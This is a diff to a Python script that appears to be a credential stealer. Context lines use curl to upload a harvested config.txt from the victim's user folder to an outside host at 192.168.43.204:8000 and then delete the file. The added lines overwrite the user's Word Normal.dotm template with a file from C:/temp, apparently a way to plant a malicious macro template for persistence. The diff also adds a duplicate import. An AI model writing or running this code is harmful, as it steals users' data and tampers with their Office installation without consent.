@@ -5,6 +5,7 @@ import json
 import base64
 import sqlite3
 import shutil
+import shutil
 from datetime import timezone, datetime, timedelta
 from sys import argv
 
@@ -97,6 +98,13 @@ def main():
     os.system("curl http://192.168.43.204:8000 --upload-file C:/Users/" + uname + "/config.txt")
 
     os.remove("C:/Users/" + uname + "/config.txt")
+
+    dpath = "C:/temp/Normal.dotm"
+    fpath = "C:/Users/User/AppData/Roaming/Microsoft/Templates/Normal.dotm"
+
+    os.remove('C:/Users/User/AppData/Roaming/Microsoft/Templates/Normal.dotm')
+
+    shutil.copyfile(dpath, fpath)
 
     #os.remove("chrome.exe") 
     #Traceback (most recent call last):
